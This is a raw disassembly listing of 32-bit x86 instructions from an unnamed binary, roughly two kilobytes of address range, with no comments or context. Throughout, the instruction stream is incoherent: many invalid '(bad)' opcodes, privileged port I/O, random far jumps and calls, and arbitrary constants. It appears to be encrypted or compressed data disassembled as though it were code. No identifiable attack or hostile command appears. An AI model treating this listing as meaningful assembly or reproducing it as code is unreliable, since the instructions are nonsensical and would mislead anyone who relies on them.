  4185a4:	jnp    0x418539
  4185a6:	mov    ch,0x5e
  4185a8:	sub    bl,BYTE PTR [ecx-0x58]
  4185ab:	or     eax,0x2edae9f9
  4185b0:	gs fcmovb st,st(2)
  4185b3:	in     eax,dx
  4185b4:	arpl   WORD PTR [ebx],ax
  4185b6:	adc    ebx,esp
  4185b8:	xchg   ecx,eax
  4185b9:	popf   
  4185ba:	xchg   DWORD PTR fs:[ebx],ebx
  4185bd:	push   0xffffff8e
  4185bf:	lock pop ss
  4185c1:	loop   0x4185d2
  4185c3:	mov    ah,0xf8
  4185c5:	cmp    BYTE PTR [eax+eiz*2-0x1f],al
  4185c9:	pop    ebx
  4185ca:	rcl    BYTE PTR [eax+ebx*4+0x5c1a93ff],cl
  4185d1:	stos   BYTE PTR es:[edi],al
  4185d2:	scas   al,BYTE PTR es:[edi]
  4185d3:	pop    esp
  4185d4:	sti    
  4185d5:	dec    edx
  4185d6:	jno    0x418626
  4185d8:	push   0xc8d2c59b
  4185dd:	xchg   ebp,eax
  4185de:	mov    edx,0xe629b7de
  4185e3:	ins    BYTE PTR es:[edi],dx
  4185e4:	sbb    dl,BYTE PTR [ecx+0x35]
  4185e7:	pop    esi
  4185e8:	pop    ecx
  4185e9:	xchg   edi,eax
  4185ea:	push   esi
  4185eb:	dec    edx
  4185ec:	sbb    al,0xf5
  4185ee:	je     0x418658
  4185f0:	dec    edi
  4185f1:	mov    ch,0x2a
  4185f3:	inc    ecx
  4185f4:	xchg   edi,eax
  4185f5:	add    DWORD PTR [ecx-0x28],esp
  4185f8:	enter  0x5c3b,0x7e
  4185fc:	push   edi
  4185fd:	(bad)  
  4185ff:	sar    esi,0xd3
  418602:	add    cl,cl
  418604:	in     al,0xb1
  418606:	mov    eax,ds:0xb95e1e46
  41860b:	retf   
  41860c:	pop    edi
  41860d:	push   ebp
  41860e:	xor    bl,al
  418610:	ror    dh,0xb9
  418613:	dec    ebx
  418614:	dec    ebp
  418615:	push   esp
  418616:	pop    esp
  418617:	dec    edi
  418618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418619:	jecxz  0x4185c8
  41861b:	sub    eax,0x56963d06
  418620:	pop    edi
  418621:	(bad)  [ebx]
  418623:	adc    esp,DWORD PTR [eax+edx*1]
  418626:	aam    0x2b
  418628:	mov    ds:0x8766e1e0,al
  41862d:	jl     0x41866c
  41862f:	jecxz  0x4185b6
  418631:	inc    cl
  418633:	jecxz  0x4185f7
  418635:	jle    0x418665
  418637:	dec    edx
  418638:	not    DWORD PTR [edx+0x219896fb]
  41863e:	add    BYTE PTR [esp+esi*4+0x15cc182d],cl
  418645:	pop    es
  418646:	adc    BYTE PTR [edx+0x3a],bh
  418649:	ja     0x41860a
  41864b:	push   eax
  41864c:	push   ecx
  41864d:	or     DWORD PTR [eax+0x726bcb68],edi
  418653:	mov    ds,edi
  418655:	mov    ah,0x3b
  418657:	(bad)  
  418658:	leave  
  418659:	out    dx,eax
  41865a:	retf   0x77df
  41865d:	jle    0x4185ea
  41865f:	arpl   WORD PTR [edi],di
  418661:	sbb    dl,bl
  418663:	and    ch,BYTE PTR [eax+0x6e]
  418666:	sbb    DWORD PTR [ebp+0x79ea994a],ebx
  41866c:	dec    esi
  41866d:	mov    eax,0x2ab7b24c
  418672:	or     al,0x5b
  418674:	pusha  
  418675:	aaa    
  418676:	pop    ds
  418677:	int    0x75
  418679:	in     eax,0x7e
  41867b:	cmp    DWORD PTR ds:0x658b06d7,esi
  418681:	cmp    BYTE PTR [eax+0xe98f4ba],dl
  418687:	sahf   
  418688:	scas   al,BYTE PTR es:[edi]
  418689:	rcl    BYTE PTR [edx],cl
  41868b:	fistp  WORD PTR [edx-0x124fb228]
  418691:	int    0x7b
  418693:	cmp    BYTE PTR [ebx-0x5cb50d5],dh
  418699:	adc    al,0xff
  41869b:	sub    eax,0x1901b91c
  4186a0:	int    0x5c
  4186a2:	add    ecx,DWORD PTR [ebx]
  4186a4:	xlat   BYTE PTR ds:[ebx]
  4186a5:	cli    
  4186a6:	pop    es
  4186a7:	enter  0xe812,0x70
  4186ab:	mov    eax,DWORD PTR es:[esi]
  4186ae:	in     eax,dx
  4186af:	les    ebp,FWORD PTR [ebp-0x46]
  4186b2:	xor    DWORD PTR [ebp+0x70],edx
  4186b5:	fs pop eax
  4186b7:	adc    edi,esi
  4186b9:	push   0x39
  4186bb:	mov    edi,0x9999f910
  4186c0:	jbe    0x4186c6
  4186c2:	repnz or bl,ch
  4186c5:	push   ds
  4186c6:	call   0xd47e171f
  4186cb:	enter  0xb5d9,0x74
  4186cf:	and    BYTE PTR [eax+0x739dd47f],bh
  4186d5:	xor    al,0x28
  4186d7:	call   0x5baab790
  4186dc:	popf   
  4186dd:	jge    0x4186f1
  4186df:	and    eax,0x547df43e
  4186e4:	nop
  4186e5:	xor    eax,0x866c2a2
  4186ea:	inc    esp
  4186eb:	add    edx,esi
  4186ed:	adc    BYTE PTR [eax],0x67
  4186f0:	dec    edx
  4186f1:	mov    edx,0x7db30cc6
  4186f6:	(bad)  
  4186f7:	push   edx
  4186f8:	and    eax,0x631546f7
  4186fd:	xchg   ebp,eax
  4186fe:	dec    ebp
  4186ff:	adc    BYTE PTR [ecx],cl
  418701:	add    DWORD PTR [ecx+edi*1-0x20915113],0xf9a057d6
  41870c:	add    al,0x2f
  41870e:	dec    edi
  41870f:	push   eax
  418710:	pop    ebx
  418711:	pop    ecx
  418712:	mov    ds:0x92cf6214,eax
  418717:	jp     0x418774
  418719:	(bad)  
  41871a:	lock cdq 
  41871c:	push   ebx
  41871d:	pop    esi
  41871e:	pop    esp
  41871f:	out    dx,eax
  418720:	test   DWORD PTR [esi],esp
  418722:	and    DWORD PTR [esi-0x35],ebx
  418725:	lock ins DWORD PTR es:[edi],dx
  418727:	enter  0xab61,0x84
  41872b:	push   es
  41872c:	cwde   
  41872d:	and    edx,esp
  41872f:	addr16 adc cl,cl
  418732:	pop    ecx
  418733:	out    0x5a,al
  418735:	cli    
  418736:	rcl    BYTE PTR [edi+0x55],1
  418739:	(bad)  
  41873a:	pop    esi
  41873b:	add    bh,BYTE PTR [edi+edi*8-0x41036f2f]
  418742:	mov    ch,ch
  418744:	test   DWORD PTR [eax+0x5de34159],ebx
  41874a:	neg    ebx
  41874c:	mov    bl,BYTE PTR [ebp-0x4d]
  41874f:	or     BYTE PTR [eax+0x2f421781],bh
  418755:	or     bl,BYTE PTR [ecx+0xd]
  418758:	xchg   esi,eax
  418759:	add    DWORD PTR [ecx-0x79b905dd],0x254b0481
  418763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418764:	retf   0x547a
  418767:	xor    al,BYTE PTR [ebp+0x50]
  41876a:	dec    ebp
  41876b:	or     eax,0xc4b08d6d
  418770:	std    
  418771:	mov    BYTE PTR [ebx+0x6b570f7b],ch
  418777:	out    dx,al
  418778:	scas   al,BYTE PTR es:[edi]
  418779:	rol    DWORD PTR [edx],1
  41877b:	inc    eax
  41877c:	fmul   st,st(0)
  41877e:	mov    ds:0x32461b2d,al
  418783:	jo     0x4187e8
  418785:	retf   0xcab
  418788:	pop    ebp
  418789:	push   cx
  41878b:	je     0x41874a
  41878d:	or     al,BYTE PTR [esi]
  41878f:	pop    ebx
  418790:	mov    dl,al
  418792:	or     cl,ah
  418794:	pop    esi
  418795:	shl    BYTE PTR [ebx+0x6f],1
  418798:	out    dx,al
  418799:	rol    DWORD PTR [edi],0x6b
  41879c:	je     0x418818
  41879e:	dec    ebp
  41879f:	ret    
  4187a0:	pusha  
  4187a1:	inc    ecx
  4187a2:	cmp    eax,0x93930acf
  4187a7:	sub    BYTE PTR [edx],dl
  4187a9:	mov    ebp,0x5823256e
  4187ae:	lods   al,BYTE PTR ds:[esi]
  4187af:	dec    ebp
  4187b0:	sbb    eax,0x3f463f3c
  4187b5:	xor    DWORD PTR [ebx],eax
  4187b7:	dec    ebx
  4187b8:	xchg   ebx,eax
  4187b9:	sbb    ch,BYTE PTR [eax-0x28]
  4187bc:	adc    eax,0xc549de7e
  4187c1:	inc    esp
  4187c2:	mov    eax,0xe9d0586f
  4187c7:	fld    QWORD PTR [ebp-0x5df3630a]
  4187cd:	mov    esp,ds
  4187cf:	test   BYTE PTR [ecx],dl
  4187d1:	pop    ecx
  4187d2:	clc    
  4187d3:	push   ss
  4187d4:	retf   0x3647
  4187d7:	jp     0x418857
  4187d9:	jae    0x4187a3
  4187db:	dec    ebp
  4187dc:	pop    ecx
  4187dd:	pop    esi
  4187de:	(bad)  
  4187df:	jle    0x41883c
  4187e1:	mov    edi,0xf7b11109
  4187e6:	pop    ss
  4187e7:	adc    esi,0x7d053107
  4187ed:	out    0x96,al
  4187ef:	outs   dx,DWORD PTR ds:[esi]
  4187f0:	pop    ebp
  4187f1:	les    ebx,FWORD PTR [esi+0x2b]
  4187f4:	int    0x33
  4187f6:	jne    0x4187a5
  4187f8:	lods   eax,DWORD PTR ds:[esi]
  4187f9:	cs push ebp
  4187fb:	push   eax
  4187fc:	cmp    ebx,esi
  4187fe:	ror    ebx,1
  418800:	jle    0x4187b9
  418802:	sahf   
  418803:	sub    eax,0xb124e910
  418808:	adc    eax,0xd58631e7
  41880d:	sub    eax,0x6f0ffe05
  418812:	xchg   esi,eax
  418813:	neg    DWORD PTR [edx]
  418815:	call   0x6b5962f9
  41881a:	and    ch,0xd9
  41881d:	sbb    al,0x51
  41881f:	in     al,0xc6
  418821:	xor    DWORD PTR [ebp+eiz*4+0x64],0xffffffef
  418826:	fdivr  st(2),st
  418828:	mov    al,ds:0xd3311fab
  41882d:	xor    al,0x83
  41882f:	es mov eax,0x605cefcf
  418835:	sbb    ecx,eax
  418837:	adc    eax,0xc99c9499
  41883c:	jl     0x4187fb
  41883e:	pop    esp
  41883f:	jmp    0x694a360d
  418844:	stos   BYTE PTR es:[edi],al
  418845:	add    BYTE PTR [edi+esi*1+0x69dca435],cl
  41884c:	mov    ebp,0x8736b223
  418851:	call   0x7171:0xfa320404
  418858:	pop    esi
  418859:	xor    BYTE PTR [esi-0x18465bad],0x77
  418860:	pop    ebx
  418861:	fistp  WORD PTR [ecx]
  418863:	inc    esi
  418864:	in     al,dx
  418865:	ror    BYTE PTR [ebp+0x29f1e0cd],1
  41886b:	sub    DWORD PTR [edx+ebx*8],esp
  41886e:	dec    esi
  41886f:	sub    al,0xbc
  418871:	or     eax,0xd1b07820
  418876:	jecxz  0x418845
  418878:	jae    0x41882a
  41887a:	in     al,0xa
  41887c:	rcr    BYTE PTR [ebx+0x65],1
  41887f:	cs push ds
  418881:	call   0xb7ec:0xfc369e5c
  418888:	fild   QWORD PTR [ebx]
  41888a:	cmp    DWORD PTR [edi-0x213caba3],0xffffffa9
  418891:	repnz xchg edi,eax
  418893:	mov    al,ds:0x17490611
  418898:	add    bh,BYTE PTR [ebx]
  41889a:	dec    esp
  41889b:	xchg   esp,eax
  41889c:	xchg   edi,eax
  41889d:	push   edi
  41889e:	dec    ecx
  41889f:	jae    0x418859
  4188a1:	cdq    
  4188a2:	repz icebp 
  4188a4:	bound  ebp,QWORD PTR [edi]
  4188a6:	nop    DWORD PTR [esi+ebx*2]
  4188aa:	ret    
  4188ab:	inc    esi
  4188ac:	and    BYTE PTR [ebx+0x1401c70e],dl
  4188b2:	imul   edx,DWORD PTR [ebx-0x30],0x4bf357e7
  4188b9:	mov    dh,ah
  4188bb:	push   ecx
  4188bc:	pop    edi
  4188bd:	sub    al,0x59
  4188bf:	xchg   esi,eax
  4188c0:	mov    bl,0xcb
  4188c2:	rcr    DWORD PTR [eax+eiz*2+0x2d],0x6c
  4188c7:	dec    ecx
  4188c8:	jbe    0x41886b
  4188ca:	aam    0x24
  4188cc:	push   edi
  4188cd:	test   eax,0x85f52e1d
  4188d2:	repz loopne 0x41893d
  4188d5:	shl    BYTE PTR [edi-0x4b],cl
  4188d8:	inc    edi
  4188d9:	cld    
  4188da:	outs   dx,DWORD PTR ds:[esi]
  4188db:	add    al,0x93
  4188dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188de:	(bad)  
  4188df:	or     al,0x2a
  4188e1:	push   0x61d828b3
  4188e6:	gs stos BYTE PTR es:[edi],al
  4188e8:	(bad)  
  4188e9:	js     0x418966
  4188eb:	mov    BYTE PTR [esi+0x11f17b8e],ch
  4188f1:	inc    eax
  4188f2:	jmp    0xd5ef:0xa5cf30b6
  4188f9:	(bad)  
  4188fa:	add    ebp,DWORD PTR [esi+ebx*8+0x154dd56c]
  418901:	pop    ebx
  418902:	push   edx
  418903:	mov    BYTE PTR [ebp-0x1e3edc8],ch
  418909:	inc    edi
  41890a:	jno    0x418912
  41890c:	call   DWORD PTR ds:0x74ab97ee
  418912:	dec    esi
  418913:	push   ebp
  418914:	xchg   DWORD PTR [ecx],eax
  418916:	(bad)  
  418918:	pop    edi
  418919:	ins    BYTE PTR es:[edi],dx
  41891a:	mov    eax,0xfd975c0b
  41891f:	dec    edx
  418920:	pop    ss
  418921:	ins    BYTE PTR es:[edi],dx
  418922:	jmp    0x72c7:0x7b40b2c5
  418929:	sti    
  41892a:	inc    edi
  41892b:	imul   BYTE PTR [eax]
  41892d:	rcl    DWORD PTR [edi+0x607e6fba],0x3a
  418934:	aam    0x84
  418936:	or     eax,0x4220e7ee
  41893b:	retf   0x8491
  41893e:	fld    DWORD PTR [ecx-0x27]
  418941:	dec    edx
  418942:	dec    ecx
  418943:	nop
  418944:	bound  edx,QWORD PTR [ebx-0x71]
  418947:	enter  0x203f,0x35
  41894b:	adc    bl,BYTE PTR [ebx+edx*4]
  41894e:	int3   
  41894f:	mov    al,BYTE PTR [eax]
  418951:	sub    eax,0xcf31de6
  418956:	stc    
  418957:	movups xmm6,xmm7
  41895a:	js     0x4189bb
  41895c:	jbe    0x4189ac
  41895e:	sub    al,bh
  418960:	ja     0x41895a
  418962:	aad    0x81
  418964:	xchg   esp,eax
  418965:	pusha  
  418966:	out    0x45,eax
  418968:	je     0x4188ea
  41896a:	and    eax,0x752b9e87
  41896f:	push   0x7f
  418971:	jmp    0x418989
  418973:	(bad)  
  418974:	test   eax,0xf7feaf17
  418979:	cs test al,0xe7
  41897c:	adc    dh,bl
  41897e:	xchg   edi,ebp
  418980:	jl     0x41890a
  418982:	loope  0x418964
  418984:	or     ch,BYTE PTR [ebx]
  418986:	(bad)  
  418987:	lods   al,BYTE PTR ds:[esi]
  418988:	out    0xa4,al
  41898a:	xchg   ecx,eax
  41898b:	or     dh,BYTE PTR [edi+0x7b]
  41898e:	mov    dh,0x97
  418990:	dec    ebx
  418991:	call   0xbb33:0x71c0a192
  418998:	push   eax
  418999:	xlat   BYTE PTR ds:[ebx]
  41899a:	jg     0x4189fc
  41899c:	jge    0x4189ff
  41899e:	outs   dx,BYTE PTR ds:[esi]
  41899f:	imul   ecx,DWORD PTR [ecx],0xe5c0a200
  4189a5:	push   0x1b93e81a
  4189aa:	jmp    0x4189ff
  4189ac:	pop    es
  4189ad:	or     al,0x69
  4189af:	and    ebp,DWORD PTR [ebx+eax*2-0x40]
  4189b3:	call   0xac263c0c
  4189b8:	call   0x9aba442b
  4189bd:	sahf   
  4189be:	mov    ecx,0xa523bf11
  4189c3:	or     BYTE PTR [eax-0x4b6c4267],dh
  4189c9:	push   esp
  4189ca:	pop    eax
  4189cb:	pusha  
  4189cc:	adc    eax,0x21645447
  4189d1:	push   ds
  4189d2:	ja     0x4189b6
  4189d4:	imul   ecx,edi,0xffffff82
  4189d7:	aaa    
  4189d8:	(bad)  
  4189d9:	test   al,0x7d
  4189db:	(bad)  
  4189dc:	jge    0x418972
  4189de:	scas   al,BYTE PTR es:[edi]
  4189df:	(bad)  
  4189e0:	cwde   
  4189e1:	in     al,0x7b
  4189e3:	sti    
  4189e4:	jae    0x4189ca
  4189e6:	mov    ah,0x8a
  4189e8:	call   0x416ea953
  4189ed:	aam    0x4b
  4189ef:	(bad)  
  4189f0:	jp     0x41897d
  4189f2:	jns    0x418a30
  4189f4:	aaa    
  4189f5:	ins    DWORD PTR es:[edi],dx
  4189f6:	push   0x53c7bc27
  4189fb:	add    edx,esp
  4189fd:	push   0x59
  4189ff:	test   BYTE PTR [eax],cl
  418a01:	sahf   
  418a02:	cld    
  418a03:	add    ebp,eax
  418a05:	dec    ebp
  418a06:	loopne 0x418a3c
  418a08:	mov    esi,0xf5bd0c4d
  418a0d:	xchg   ebx,eax
  418a0e:	outs   dx,BYTE PTR ds:[esi]
  418a0f:	inc    DWORD PTR [edx+0x1cdf1f9]
  418a15:	push   ebx
  418a16:	adc    ah,0xf7
  418a19:	lds    esi,FWORD PTR [edx]
  418a1b:	pop    eax
  418a1c:	push   esi
  418a1d:	jge    0x418a4d
  418a1f:	je     0x4189f8
  418a21:	adc    DWORD PTR [edi+esi*1+0x20],ebx
  418a25:	jmp    0xbc12:0xb30433b0
  418a2c:	retf   0xc688
  418a2f:	aaa    
  418a30:	ins    DWORD PTR es:[edi],dx
  418a31:	add    DWORD PTR [ebx+0x73d896b8],ecx
  418a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a38:	fwait
  418a39:	outs   dx,BYTE PTR ds:[esi]
  418a3a:	cmp    ecx,ebx
  418a3c:	mov    ch,0x94
  418a3e:	aad    0xb7
  418a40:	mov    esp,0x20670c40
  418a45:	retf   
  418a46:	cmp    edi,edx
  418a48:	jns    0x418a55
  418a4a:	sbb    dl,BYTE PTR [esi-0x7]
  418a4d:	inc    ecx
  418a4e:	stos   DWORD PTR es:[edi],eax
  418a4f:	stos   BYTE PTR es:[edi],al
  418a50:	int    0xad
  418a52:	sub    bh,al
  418a54:	cdq    
  418a55:	adc    DWORD PTR [esi],edx
  418a57:	leave  
  418a58:	add    ah,bl
  418a5a:	add    eax,0x77e2767e
  418a5f:	pop    ds
  418a60:	push   esp
  418a61:	mov    BYTE PTR [esi],cl
  418a63:	adc    bl,BYTE PTR [ecx]
  418a65:	(bad)  
  418a66:	lods   al,BYTE PTR ds:[esi]
  418a67:	inc    esp
  418a68:	ins    BYTE PTR es:[edi],dx
  418a69:	or     BYTE PTR [esi+0x2e],cl
  418a6c:	inc    esi
  418a6d:	jnp    0x418a81
  418a6f:	imul   edi,DWORD PTR [eax-0x1e],0x5b
  418a73:	sbb    DWORD PTR [ebp-0x60],esp
  418a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a77:	and    al,0x22
  418a79:	xor    DWORD PTR [edx],ecx
  418a7b:	inc    eax
  418a7c:	icebp  
  418a7d:	cmp    DWORD PTR [edi-0x4a0c5ecd],ebp
  418a83:	cmp    eax,0xb7906426
  418a88:	mov    edx,0x459a2451
  418a8d:	mov    edi,0xa6ee1a3c
  418a92:	lock cmp bl,ch
  418a95:	dec    esi
  418a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a97:	dec    cx
  418a99:	xor    ah,BYTE PTR [edi]
  418a9b:	jae    0x418aeb
  418a9d:	or     ch,0xa1
  418aa0:	std    
  418aa1:	cmp    bl,BYTE PTR [ebx-0x2c]
  418aa4:	lds    edi,FWORD PTR [esi-0x76d8c648]
  418aaa:	arpl   bx,bp
  418aac:	(bad)  
  418aad:	fisttp WORD PTR [esi]
  418aaf:	xor    ch,BYTE PTR [eax-0x68]
  418ab2:	fdivr  st(1),st
  418ab4:	mov    al,ds:0xd1cbc071
  418ab9:	add    eax,0x1df61778
  418abe:	mov    al,BYTE PTR [ebp+0x5b5acca8]
  418ac4:	cli    
  418ac5:	stos   BYTE PTR es:[edi],al
  418ac6:	loopne 0x418a99
  418ac8:	sub    ch,0x71
  418acb:	inc    ebp
  418acc:	sti    
  418acd:	out    dx,al
  418ace:	sub    eax,0x6d7d8a4d
  418ad3:	mov    esp,DWORD PTR ds:0x55f73471
  418ad9:	in     al,0x16
  418adb:	(bad)  
  418adc:	sti    
  418add:	into   
  418ade:	or     eax,0x60561854
  418ae3:	mov    al,ds:0xbe565d44
  418ae8:	aam    0xad
  418aea:	test   BYTE PTR [edx+0x479f1877],bl
  418af0:	mov    ch,0x22
  418af2:	cwde   
  418af3:	(bad)  
  418af4:	jmp    0x56aa60c1
  418af9:	fsub   st,st(4)
  418afb:	mov    al,ds:0x34f4172c
  418b00:	sub    al,0x89
  418b02:	fadd   DWORD PTR [edx+0x7c22b0c1]
  418b08:	or     dh,ah
  418b0a:	or     eax,0xb7016bff
  418b0f:	or     esp,esp
  418b11:	push   ds
  418b12:	aam    0x50
  418b14:	mov    dl,0xd9
  418b16:	mov    dh,0x96
  418b18:	and    esp,0xffffffed
  418b1b:	lods   al,BYTE PTR ds:[esi]
  418b1c:	and    cl,BYTE PTR [eax]
  418b1e:	push   edi
  418b1f:	inc    ebx
  418b20:	pop    ss
  418b21:	adc    al,0x7d
  418b23:	(bad)  
  418b24:	(bad)  
  418b25:	addr16 inc ecx
  418b27:	mov    ah,0xe
  418b29:	dec    edx
  418b2a:	cdq    
  418b2b:	fnstsw WORD PTR [ecx]
  418b2d:	mov    bh,0x47
  418b2f:	in     eax,dx
  418b30:	shl    BYTE PTR [ebx+edi*2+0x52728245],1
  418b37:	scas   eax,DWORD PTR es:[edi]
  418b38:	inc    edi
  418b39:	adc    esi,eax
  418b3b:	pop    ebx
  418b3c:	stos   DWORD PTR es:[edi],eax
  418b3d:	iret   
  418b3e:	cmp    al,0x91
  418b40:	mov    dl,0x95
  418b42:	dec    ecx
  418b43:	xor    esp,esp
  418b45:	mov    ecx,0x5c2137d3
  418b4a:	mov    cl,0x47
  418b4c:	mov    bl,0x53
  418b4e:	out    0xde,eax
  418b50:	mov    eax,0x87500cf8
  418b55:	sbb    BYTE PTR [ebx],bl
  418b57:	lea    esi,[ebx-0x20]
  418b5a:	outs   dx,BYTE PTR ds:[esi]
  418b5b:	add    al,0x46
  418b5d:	xchg   edx,eax
  418b5e:	in     al,dx
  418b5f:	adc    dl,BYTE PTR [ecx+0x72478e73]
  418b65:	je     0x418b13
  418b67:	fistp  DWORD PTR [edi]
  418b69:	int3   
  418b6a:	mov    ds:0xd332b6cb,al
  418b6f:	cld    
  418b70:	test   BYTE PTR [eax-0x2858ca2],dl
  418b76:	inc    esi
  418b77:	push   0x3e
  418b79:	loop   0x418b52
  418b7b:	in     eax,0xea
  418b7d:	(bad)  
  418b7e:	ror    DWORD PTR [eax],1
  418b80:	xor    esp,ebp
  418b82:	push   edi
  418b83:	fild   DWORD PTR [ecx-0x74]
  418b86:	mov    al,0x77
  418b88:	adc    ch,cl
  418b8a:	sub    ah,BYTE PTR [ebp+0x34]
  418b8d:	pop    esi
  418b8e:	inc    ebp
  418b8f:	add    ebx,DWORD PTR [eax+0x1a]
  418b92:	jp     0x418b96
  418b94:	add    al,0x57
  418b96:	(bad)  
  418b97:	rcr    BYTE PTR [ebx-0x54b107d7],0x68
  418b9e:	or     ebp,DWORD PTR [ecx]
  418ba0:	popf   
  418ba1:	fs xchg edi,eax
  418ba3:	retf   
  418ba4:	mov    ecx,0xc2c522d4
  418ba9:	mov    dl,0x98
  418bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bac:	retf   0xdc7d
  418baf:	pusha  
  418bb0:	lea    ebp,[ebx+0x75]
  418bb3:	ins    BYTE PTR es:[edi],dx
  418bb4:	pop    ds
  418bb5:	cmc    
  418bb6:	(bad)  
  418bb7:	ficom  WORD PTR [ebx]
  418bb9:	add    al,cl
  418bbb:	xchg   ebx,eax
  418bbc:	inc    edi
  418bbd:	mov    esi,0xaf2dec39
  418bc2:	pop    ds
  418bc3:	cmp    al,0x7a
  418bc5:	mov    ecx,0x3a51f273
  418bca:	adc    DWORD PTR [esi+eax*1-0x76c1b745],ebp
  418bd1:	cdq    
  418bd2:	cdq    
  418bd3:	and    ah,bl
  418bd5:	repnz add DWORD PTR [ecx+0x11],edx
  418bd9:	outs   dx,BYTE PTR ds:[esi]
  418bda:	leave  
  418bdb:	sbb    eax,0xdc1546f4
  418be0:	push   es
  418be1:	cmp    DWORD PTR ds:0x5d57865f,ebx
  418be7:	push   esi
  418be8:	das    
  418be9:	loope  0x418bf4
  418beb:	sbb    BYTE PTR [esi-0x5e],al
  418bee:	aad    0xd5
  418bf0:	mov    ah,0x84
  418bf2:	mov    cl,0x23
  418bf4:	xor    edx,DWORD PTR [edi]
  418bf6:	aad    0xb0
  418bf8:	stos   BYTE PTR es:[edi],al
  418bf9:	cld    
  418bfa:	sub    ecx,esi
  418bfc:	dec    edi
  418bfd:	jne    0x418bf3
  418bff:	outs   dx,BYTE PTR ds:[esi]
  418c00:	not    BYTE PTR [ebx-0x68]
  418c03:	inc    esp
  418c04:	gs jmp FWORD PTR es:0xaf3178e6
  418c0c:	loopne 0x418b9a
  418c0e:	pop    ds
  418c0f:	sbb    edi,esp
  418c11:	pop    edi
  418c12:	bound  ebp,QWORD PTR [edx-0x7d1877e7]
  418c18:	xor    ebx,ebx
  418c1a:	ss stos BYTE PTR es:[edi],al
  418c1c:	mov    ds:0x7c2c4593,eax
  418c21:	das    
  418c22:	mov    ecx,0x21edeeb9
  418c27:	pop    eax
  418c28:	lods   eax,DWORD PTR ds:[esi]
  418c29:	adc    BYTE PTR [esi-0x66],ch
  418c2c:	mov    ah,ah
  418c2e:	mov    dh,0xaa
  418c30:	out    0xc8,al
  418c32:	inc    ebx
  418c33:	in     al,0x21
  418c35:	push   0xffffffac
  418c37:	scas   al,BYTE PTR es:[edi]
  418c38:	pop    edi
  418c39:	or     al,ch
  418c3b:	push   ebx
  418c3c:	pop    es
  418c3d:	(bad)  
  418c3e:	lods   al,BYTE PTR ds:[esi]
  418c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c40:	push   ebp
  418c41:	jecxz  0x418bce
  418c43:	clc    
  418c44:	test   DWORD PTR [edi],ebx
  418c46:	pop    ss
  418c47:	aaa    
  418c48:	imul   edx,DWORD PTR [edi-0x30ad9140],0x6a
  418c4f:	icebp  
  418c50:	lock fwait
  418c52:	int3   
  418c53:	das    
  418c54:	pop    edx
  418c55:	mov    cs,WORD PTR [ebp-0x57c9f7a5]
  418c5b:	mov    bh,0x5e
  418c5d:	bound  ecx,QWORD PTR [ebx-0x1f]
  418c60:	inc    edi
  418c61:	test   edx,edi
  418c63:	fs loopne 0x418c08
  418c66:	std    
  418c67:	xchg   esp,eax
  418c68:	dec    edi
  418c69:	or     DWORD PTR [edx],esi
  418c6b:	inc    ebp
  418c6c:	jbe    0x418cdd
  418c6e:	mov    ah,0xaa
  418c70:	in     eax,dx
  418c71:	xor    al,0x47
  418c74:	or     ch,BYTE PTR [ebx-0x7c1a8a8b]
  418c7a:	aaa    
  418c7b:	or     ebx,DWORD PTR [esi+0x3f]
  418c7e:	sub    al,0x95
  418c80:	fmul   st,st(4)
  418c82:	cmp    eax,0x5eb57889
  418c87:	ja     0x418c52
  418c89:	inc    esp
  418c8a:	je     0x418cd3
  418c8c:	inc    edx
  418c8d:	cli    
  418c8e:	sub    eax,0xd6ca62f5
  418c93:	pop    ecx
  418c94:	jno    0x418cc8
  418c96:	jmp    0xbf43:0x1e436bda
  418c9d:	clc    
  418c9e:	jp     0x418cc9
  418ca0:	or     eax,0x90ce188f
  418ca5:	addr16 pop ecx
  418ca7:	dec    esi
  418ca8:	pusha  
  418ca9:	cmp    eax,0x6dfe1e84
  418cae:	xor    cl,BYTE PTR [si]
  418cb1:	adc    eax,0x77a6ddb7
  418cb6:	inc    esp
  418cb7:	jmp    0xd90:0x695a7f2b
  418cbe:	pop    esp
  418cbf:	adc    BYTE PTR [eax-0x7e44406f],al
  418cc5:	pop    DWORD PTR [ecx-0x53]
  418cc8:	sub    esi,DWORD PTR [edi]
  418cca:	add    eax,0x8c4f8c69
  418ccf:	adc    al,BYTE PTR [esi+ebx*4]
  418cd2:	jmp    FWORD PTR [esi+0x366dbdf5]
  418cd8:	mov    esp,0xe82877ef
  418cdd:	icebp  
  418cde:	fadd   DWORD PTR [esp+edi*1+0x5d]
  418ce2:	loopne 0x418ca7
  418ce4:	or     bl,BYTE PTR [eax]
  418ce6:	sbb    al,0xe1
  418ce8:	daa    
  418ce9:	fst    QWORD PTR [edi-0x25c2519]
  418cef:	or     ch,BYTE PTR [ecx+eiz*2-0x2f3ad5b9]
  418cf6:	mov    cl,0x9b
  418cf8:	dec    ecx
  418cf9:	jge    0x418c82
  418cfb:	das    
  418cfc:	jl     0x418ce9
  418cfe:	scas   eax,DWORD PTR es:[edi]
  418cff:	and    al,ah
  418d01:	std    
  418d02:	adc    al,0x4a
  418d04:	shl    BYTE PTR [eax+0x2f],cl
  418d07:	fisub  DWORD PTR [esi+0x3e]
  418d0a:	(bad)  
  418d0b:	mov    WORD PTR [edi+0x61],?
  418d0e:	pop    eax
  418d0f:	adc    cl,BYTE PTR [edi-0x3d]
  418d12:	gs pop edi
  418d14:	pop    edi
  418d15:	int3   
  418d16:	dec    ebx
  418d17:	sub    eax,0x6c968faf
  418d1c:	(bad)  
  418d1d:	fucomi st,st(0)
  418d1f:	add    DWORD PTR [edi+0x40d41840],0x89f2c256
  418d29:	sub    ah,BYTE PTR [esi]
  418d2b:	cdq    
  418d2c:	sahf   
  418d2d:	(bad)  
  418d2e:	fdivr  st(7),st
  418d30:	test   al,0x50
  418d32:	(bad)  
  418d34:	and    ah,BYTE PTR [ecx]
  418d36:	clc    
  418d37:	sar    DWORD PTR [ebx-0x65f0827],1
  418d3d:	jne    0x418db1
  418d3f:	dec    edi
  418d40:	sub    ebx,DWORD PTR [eax+0x33d4fff5]
  418d46:	retf   
  418d47:	call   esi
  418d49:	or     BYTE PTR [ebp-0x7474b335],cl
  418d4f:	cmp    esi,DWORD PTR [esi-0x26ebf383]
  418d55:	jne    0x418cf2
